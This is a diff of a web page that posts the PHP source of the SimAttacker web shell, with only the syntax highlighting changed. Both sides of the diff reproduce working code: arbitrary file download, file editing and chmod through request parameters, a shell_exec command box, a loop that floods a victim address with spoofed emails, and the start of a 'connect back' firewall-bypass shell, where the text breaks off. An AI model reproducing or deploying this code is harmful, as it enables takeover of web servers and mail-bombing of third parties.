@@ -39,385 +39,384 @@
 
 <h3>SimAttacker Shell Source Code</h3>
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?
-//download Files  Code
-$fdownload=$_GET['fdownload'];
-if ($fdownload &lt;&gt; "" ){
-// path & file name
-$path_parts = pathinfo("$fdownload");
-$entrypath=$path_parts["basename"];
-$name = "$fdownload";
-$fp = fopen($name, 'rb');
-header("Content-Disposition: attachment; filename=$entrypath");
-header("Content-Length: " . filesize($name));
-fpassthru($fp);
-exit;
-}
-?&gt;
-    
-&lt;html&gt;
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
+<span class="c1">//download Files  Code</span>
+<span class="nv">$fdownload</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fdownload&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$fdownload</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span> <span class="p">){</span>
+<span class="c1">// path &amp; file name</span>
+<span class="nv">$path_parts</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$fdownload</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="nv">$entrypath</span><span class="o">=</span><span class="nv">$path_parts</span><span class="p">[</span><span class="s2">&quot;basename&quot;</span><span class="p">];</span>
+<span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$fdownload</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=</span><span class="si">$entrypath</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Length: &quot;</span> <span class="o">.</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$name</span><span class="p">));</span>
+<span class="nb">fpassthru</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+<span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    </span>
+<span class="x">&amp;lt;html&amp;gt;</span>
 
-&lt;head&gt;
-&lt;meta http-equiv="Content-Language" content="en-us"&gt;
-&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1252"&gt;
-&lt;title&gt;SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend &lt;/title&gt;
-&lt;style&gt;
-&lt;!--
-body         { font-family: Tahoma; font-size: 8pt }
---&gt;
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;?
-error_reporting(E_ERROR | E_WARNING | E_PARSE);
+<span class="x">&amp;lt;head&amp;gt;</span>
+<span class="x">&amp;lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;en-us&quot;&amp;gt;</span>
+<span class="x">&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1252&quot;&amp;gt;</span>
+<span class="x">&amp;lt;title&amp;gt;SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend &amp;lt;/title&amp;gt;</span>
+<span class="x">&amp;lt;style&amp;gt;</span>
+<span class="x">&amp;lt;!--</span>
+<span class="x">body         { font-family: Tahoma; font-size: 8pt }</span>
+<span class="x">--&amp;gt;</span>
+<span class="x">&amp;lt;/style&amp;gt;</span>
+<span class="x">&amp;lt;/head&amp;gt;</span>
+<span class="x">&amp;lt;body&amp;gt;</span>
+<span class="cp">&lt;?</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ERROR</span> <span class="o">|</span> <span class="k">E_WARNING</span> <span class="o">|</span> <span class="k">E_PARSE</span><span class="p">);</span>
 
- //File Edit
- $fedit=$_GET['fedit'];
- if ($fedit &lt;&gt; "" ){
- $fedit=realpath($fedit);
- $lines = file($fedit);
- echo "&lt;form action='' method='POST'&gt;";
-echo "&lt;textarea name='savefile' rows=30 cols=80&gt;" ;
-foreach ($lines as $line_num =&gt; $line) {
- echo htmlspecialchars($line);
-}
-echo "&lt;/textarea&gt;
-    &lt;input type='text' name='filepath'  size='60' value='$fedit'&gt;
-    &lt;input type='submit' value='save'&gt;&lt;/form&gt;";
-    $savefile=$_POST['savefile'];
-    $filepath=realpath($_POST['filepath']);
-    if ($savefile &lt;&gt; "") 
-    {
-    $fp=fopen("$filepath","w+");
-    fwrite ($fp,"") ;
-    fwrite ($fp,$savefile) ;
-    fclose($fp);
-    echo "&lt;script language='javascript'&gt; close()&lt;/script&gt;";
-    }
-exit();
- }
-?&gt;
-&lt;?
-// CHmod - PRimission
-$fchmod=$_GET['fchmod'];
-if ($fchmod &lt;&gt; "" ){
-$fchmod=realpath($fchmod);
-echo "&lt;center&gt;&lt;br&gt;
-chmod for :$fchmod&lt;br&gt;
-&lt;form method='POST' action=''&gt;&lt;br&gt;
-Chmod :&lt;br&gt;
-&lt;input type='text' name='chmod0' &gt;&lt;br&gt;
-&lt;input type='submit' value='change chmod'&gt;
-&lt;/form&gt;";
-$chmod0=$_POST['chmod0'];
-if ($chmod0 &lt;&gt; ""){
-chmod ($fchmod , $chmod0);
-}else {
-echo "primission Not Allow change Chmod";
-}
-exit();
-}
-?&gt;
-    
-&lt;div align="center"&gt;
-    &lt;table border="1" width="100%" id="table1" style="border: 1px dotted #FFCC99" cellspacing="0" cellpadding="0" height="502"&gt;
-        &lt;tr&gt;
-            &lt;td style="border: 1px dotted #FFCC66" valign="top" rowspan="2"&gt;
-                &lt;p align="center"&gt;&lt;b&gt;
-                &lt;font face="Tahoma" size="2"&gt;&lt;br&gt;
-                &lt;/font&gt;
-                &lt;font color="#D2D200" face="Tahoma" size="2"&gt;
-                &lt;span style="text-decoration: none"&gt;
-                &lt;font color="#000000"&gt;
-                &lt;a href="?id=fm&dir=&lt;?
-    echo getcwd();
-    ?&gt;
-    "&gt;
-                &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;File Manager&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/span&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
-                &lt;p align="center"&gt;&lt;b&gt;&lt;a href="?id=cmd"&gt;
-                &lt;span style="text-decoration: none"&gt;
-                &lt;font face="Tahoma" size="2" color="#000000"&gt;
-                CMD&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;font face="Tahoma" size="2"&gt; Shell&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
-                &lt;p align="center"&gt;&lt;b&gt;&lt;a href="?id=fake-mail"&gt;
-                &lt;font face="Tahoma" size="2" color="#000000"&gt;
-                &lt;span style="text-decoration: none"&gt;Fake mail&lt;/span&gt;&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;
-                &lt;p align="center"&gt;&lt;b&gt;
-                &lt;font face="Tahoma" size="2" color="#000000"&gt;
-                &lt;a href="?id=cshell"&gt;
-                &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;Connect Back&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
-                &lt;p align="center"&gt;&lt;b&gt;
-                &lt;font color="#000000" face="Tahoma" size="2"&gt;
-                &lt;a href="?id="&gt;
-                &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;About&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
-                &lt;p&gt;&nbsp;&lt;p align="center"&gt;&nbsp;&lt;/td&gt;
-            &lt;td height="422" width="82%" style="border: 1px dotted #FFCC66" align="center"&gt;
-            &lt;?
-            //*******************************************************
-            //Start Programs About US
-            $id=$_GET['id'];
+ <span class="c1">//File Edit</span>
+ <span class="nv">$fedit</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fedit&#39;</span><span class="p">];</span>
+ <span class="k">if</span> <span class="p">(</span><span class="nv">$fedit</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span> <span class="p">){</span>
+ <span class="nv">$fedit</span><span class="o">=</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$fedit</span><span class="p">);</span>
+ <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$fedit</span><span class="p">);</span>
+ <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=&#39;&#39; method=&#39;POST&#39;&amp;gt;&quot;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea name=&#39;savefile&#39; rows=30 cols=80&amp;gt;&quot;</span> <span class="p">;</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$lines</span> <span class="k">as</span> <span class="nv">$line_num</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+ <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;</span>
+<span class="s2">    &amp;lt;input type=&#39;text&#39; name=&#39;filepath&#39;  size=&#39;60&#39; value=&#39;</span><span class="si">$fedit</span><span class="s2">&#39;&amp;gt;</span>
+<span class="s2">    &amp;lt;input type=&#39;submit&#39; value=&#39;save&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
+    <span class="nv">$savefile</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;savefile&#39;</span><span class="p">];</span>
+    <span class="nv">$filepath</span><span class="o">=</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filepath&#39;</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$savefile</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> 
+    <span class="p">{</span>
+    <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$filepath</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w+&quot;</span><span class="p">);</span>
+    <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">;</span>
+    <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$savefile</span><span class="p">)</span> <span class="p">;</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; close()&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="k">exit</span><span class="p">();</span>
+ <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="cp">&lt;?</span>
+<span class="c1">// CHmod - PRimission</span>
+<span class="nv">$fchmod</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fchmod&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$fchmod</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span> <span class="p">){</span>
+<span class="nv">$fchmod</span><span class="o">=</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$fchmod</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">chmod for :</span><span class="si">$fchmod</span><span class="s2">&amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;lt;form method=&#39;POST&#39; action=&#39;&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">Chmod :&amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;lt;input type=&#39;text&#39; name=&#39;chmod0&#39; &amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;lt;input type=&#39;submit&#39; value=&#39;change chmod&#39;&amp;gt;</span>
+<span class="s2">&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
+<span class="nv">$chmod0</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;chmod0&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$chmod0</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
+<span class="nb">chmod</span> <span class="p">(</span><span class="nv">$fchmod</span> <span class="p">,</span> <span class="nv">$chmod0</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+<span class="k">echo</span> <span class="s2">&quot;primission Not Allow change Chmod&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    </span>
+<span class="x">&amp;lt;div align=&quot;center&quot;&amp;gt;</span>
+<span class="x">    &amp;lt;table border=&quot;1&quot; width=&quot;100%&quot; id=&quot;table1&quot; style=&quot;border: 1px dotted #FFCC99&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; height=&quot;502&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;tr&amp;gt;</span>
+<span class="x">            &amp;lt;td style=&quot;border: 1px dotted #FFCC66&quot; valign=&quot;top&quot; rowspan=&quot;2&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;</span>
+<span class="x">                &amp;lt;font face=&quot;Tahoma&quot; size=&quot;2&quot;&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="x">                &amp;lt;/font&amp;gt;</span>
+<span class="x">                &amp;lt;font color=&quot;#D2D200&quot; face=&quot;Tahoma&quot; size=&quot;2&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;span style=&quot;text-decoration: none&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;font color=&quot;#000000&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;a href=&quot;?id=fm&amp;dir=</span><span class="cp">&lt;?</span>
+    <span class="k">echo</span> <span class="nb">getcwd</span><span class="p">();</span>
+    <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    &quot;&amp;gt;</span>
+<span class="x">                &amp;lt;span style=&quot;text-decoration: none&quot;&amp;gt;&amp;lt;font color=&quot;#000000&quot;&amp;gt;File Manager&amp;lt;/font&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="x">                &amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;&amp;lt;a href=&quot;?id=cmd&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;span style=&quot;text-decoration: none&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;font face=&quot;Tahoma&quot; size=&quot;2&quot; color=&quot;#000000&quot;&amp;gt;</span>
+<span class="x">                CMD&amp;lt;/font&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;font face=&quot;Tahoma&quot; size=&quot;2&quot;&amp;gt; Shell&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="x">                &amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;&amp;lt;a href=&quot;?id=fake-mail&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;font face=&quot;Tahoma&quot; size=&quot;2&quot; color=&quot;#000000&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;span style=&quot;text-decoration: none&quot;&amp;gt;Fake mail&amp;lt;/span&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="x">                &amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;</span>
+<span class="x">                &amp;lt;font face=&quot;Tahoma&quot; size=&quot;2&quot; color=&quot;#000000&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;a href=&quot;?id=cshell&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;span style=&quot;text-decoration: none&quot;&amp;gt;&amp;lt;font color=&quot;#000000&quot;&amp;gt;Connect Back&amp;lt;/font&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="x">                &amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;</span>
+<span class="x">                &amp;lt;font color=&quot;#000000&quot; face=&quot;Tahoma&quot; size=&quot;2&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;a href=&quot;?id=&quot;&amp;gt;</span>
+<span class="x">                &amp;lt;span style=&quot;text-decoration: none&quot;&amp;gt;&amp;lt;font color=&quot;#000000&quot;&amp;gt;About&amp;lt;/font&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="x">                &amp;lt;p&amp;gt;&amp;nbsp;&amp;lt;p align=&quot;center&quot;&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;</span>
+<span class="x">            &amp;lt;td height=&quot;422&quot; width=&quot;82%&quot; style=&quot;border: 1px dotted #FFCC66&quot; align=&quot;center&quot;&amp;gt;</span>
+<span class="x">            </span><span class="cp">&lt;?</span>
+            <span class="c1">//*******************************************************</span>
+            <span class="c1">//Start Programs About US</span>
+            <span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
 
-            if ($id=="") {
-            echo "
-            &lt;font face='Arial Black' color='#808080' size='1'&gt;
-***************************************************************************&lt;br&gt;
-&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM &lt;br&gt;
-&nbsp;Programer : Hossein Asgary &lt;br&gt;
-&nbsp;Note : SimAttacker&nbsp; Have copyright from simorgh security Group  &lt;br&gt;
-&nbsp;please : If you find bug or problems in program , tell me by : &lt;br&gt;
-&nbsp;e-mail : admin(at)simorgh-ev(dot)com&lt;br&gt;
-Enjoy <img src="/HackingScripts/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> [Only 4 Best Friends ] &lt;br&gt;
-***************************************************************************&lt;/font&gt;&lt;/span&gt;&lt;/p&gt;
-";
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$id</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&quot;</span>
+<span class="s2">            &amp;lt;font face=&#39;Arial Black&#39; color=&#39;#808080&#39; size=&#39;1&#39;&amp;gt;</span>
+<span class="s2">***************************************************************************&amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM &amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;nbsp;Programer : Hossein Asgary &amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;nbsp;Note : SimAttacker&amp;nbsp; Have copyright from simorgh security Group  &amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;nbsp;please : If you find bug or problems in program , tell me by : &amp;lt;br&amp;gt;</span>
+<span class="s2">&amp;nbsp;e-mail : admin(at)simorgh-ev(dot)com&amp;lt;br&amp;gt;</span>
+<span class="s2">Enjoy &lt;img src=&quot;</span><span class="o">/</span><span class="nx">HackingScripts</span><span class="o">/</span><span class="nx">wp</span><span class="o">-</span><span class="nx">includes</span><span class="o">/</span><span class="nx">images</span><span class="o">/</span><span class="nx">smilies</span><span class="o">/</span><span class="nx">icon_smile</span><span class="o">.</span><span class="nx">gif</span><span class="s2">&quot; alt=&quot;</span><span class="o">:</span><span class="p">)</span><span class="s2">&quot; class=&quot;</span><span class="nx">wp</span><span class="o">-</span><span class="nx">smiley</span><span class="s2">&quot; /&gt; [Only 4 Best Friends ] &amp;lt;br&amp;gt;</span>
+<span class="s2">***************************************************************************&amp;lt;/font&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="s2">&quot;</span><span class="p">;</span>
 
-echo "&lt;font color='#333333' size='2'&gt;OS :". php_uname();
-echo "&lt;br&gt;IP :". 
-($_SERVER['REMOTE_ADDR']);
-echo "&lt;/font&gt;";
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;font color=&#39;#333333&#39; size=&#39;2&#39;&amp;gt;OS :&quot;</span><span class="o">.</span> <span class="nb">php_uname</span><span class="p">();</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;IP :&quot;</span><span class="o">.</span> 
+<span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
 
 
-            }
-            //************************************************************
-            //cmd-command line
-            $cmd=$_POST['cmd'];
-            if($id=="cmd"){
-        $result=shell_exec("$cmd");
-        echo "&lt;br&gt;&lt;center&gt;&lt;h3&gt; CMD ExeCute &lt;/h3&gt;&lt;/center&gt;" ;
-        echo "&lt;center&gt;
-        &lt;textarea rows=20 cols=70 &gt;$result&lt;/textarea&gt;&lt;br&gt;
-        &lt;form method='POST' action=''&gt;
-        &lt;input type='hidden' name='id' value='cmd'&gt;
-        &lt;input type='text' size='80' name='cmd' value='$cmd'&gt;
-        &lt;input type='submit' value='cmd'&gt;&lt;br&gt;";
+            <span class="p">}</span>
+            <span class="c1">//************************************************************</span>
+            <span class="c1">//cmd-command line</span>
+            <span class="nv">$cmd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$id</span><span class="o">==</span><span class="s2">&quot;cmd&quot;</span><span class="p">){</span>
+        <span class="nv">$result</span><span class="o">=</span><span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$cmd</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt; CMD ExeCute &amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&quot;</span> <span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;</span>
+<span class="s2">        &amp;lt;textarea rows=20 cols=70 &amp;gt;</span><span class="si">$result</span><span class="s2">&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">        &amp;lt;form method=&#39;POST&#39; action=&#39;&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;input type=&#39;hidden&#39; name=&#39;id&#39; value=&#39;cmd&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;input type=&#39;text&#39; size=&#39;80&#39; name=&#39;cmd&#39; value=&#39;</span><span class="si">$cmd</span><span class="s2">&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;input type=&#39;submit&#39; value=&#39;cmd&#39;&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
             
             
             
-            }
+            <span class="p">}</span>
             
-        //********************************************************    
+        <span class="c1">//********************************************************    </span>
         
-        //fake mail = Use victim server 4 DOS - fake mail 
-        if ( $id=="fake-mail"){
-        error_reporting(0);
-        echo "&lt;br&gt;&lt;center&gt;&lt;h3&gt; Fake Mail- DOS E-mail By Victim Server &lt;/h3&gt;&lt;/center&gt;" ;
-        echo "&lt;center&gt;&lt;form method='post' action=''&gt;
-        Victim Mail :&lt;br&gt;&lt;input type='text' name='to' &gt;&lt;br&gt;
-        Number-Mail :&lt;br&gt;&lt;input type='text' size='5' name='nom' value='100'&gt;&lt;br&gt;
-        Comments:
-        &lt;br&gt;
-        &lt;textarea rows='10' cols=50 name='Comments' &gt;&lt;/textarea&gt;&lt;br&gt;
-        &lt;input type='submit' value='Send Mail Strm ' &gt;
-        &lt;/form&gt;&lt;/center&gt;";
-        //send Storm Mail
-        $to=$_POST['to'];
-        $nom=$_POST['nom'];
-        $Comments=$_POST['Comments'];
-        if ($to &lt;&gt; "" ){
-        for ($i = 0; $i &lt; $nom ; $i++){
-        $from = rand (71,1020000000)."@"."Attacker.com";
-        $subject= md5("$from");
-        mail($to,$subject,$Comments,"From:$from");
-        echo "$i is ok";
-        }      
-        echo "&lt;script language='javascript'&gt; alert('Sending Mail - please waite ...')&lt;/script&gt;";
-        }
-        }
-        //********************************************************
+        <span class="c1">//fake mail = Use victim server 4 DOS - fake mail </span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nv">$id</span><span class="o">==</span><span class="s2">&quot;fake-mail&quot;</span><span class="p">){</span>
+        <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt; Fake Mail- DOS E-mail By Victim Server &amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&quot;</span> <span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;form method=&#39;post&#39; action=&#39;&#39;&amp;gt;</span>
+<span class="s2">        Victim Mail :&amp;lt;br&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;to&#39; &amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">        Number-Mail :&amp;lt;br&amp;gt;&amp;lt;input type=&#39;text&#39; size=&#39;5&#39; name=&#39;nom&#39; value=&#39;100&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">        Comments:</span>
+<span class="s2">        &amp;lt;br&amp;gt;</span>
+<span class="s2">        &amp;lt;textarea rows=&#39;10&#39; cols=50 name=&#39;Comments&#39; &amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">        &amp;lt;input type=&#39;submit&#39; value=&#39;Send Mail Strm &#39; &amp;gt;</span>
+<span class="s2">        &amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="c1">//send Storm Mail</span>
+        <span class="nv">$to</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
+        <span class="nv">$nom</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nom&#39;</span><span class="p">];</span>
+        <span class="nv">$Comments</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Comments&#39;</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$to</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span> <span class="p">){</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$nom</span> <span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="nv">$from</span> <span class="o">=</span> <span class="nb">rand</span> <span class="p">(</span><span class="mi">71</span><span class="p">,</span><span class="mi">1020000000</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="s2">&quot;Attacker.com&quot;</span><span class="p">;</span>
+        <span class="nv">$subject</span><span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$from</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$Comments</span><span class="p">,</span><span class="s2">&quot;From:</span><span class="si">$from</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$i</span><span class="s2"> is ok&quot;</span><span class="p">;</span>
+        <span class="p">}</span>      
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; alert(&#39;Sending Mail - please waite ...&#39;)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="c1">//********************************************************</span>
 
-            //Connect Back -Firewall Bypass
-            if ($id=="cshell"){
-            echo "&lt;br&gt;Connect back Shell , bypass Firewalls&lt;br&gt;
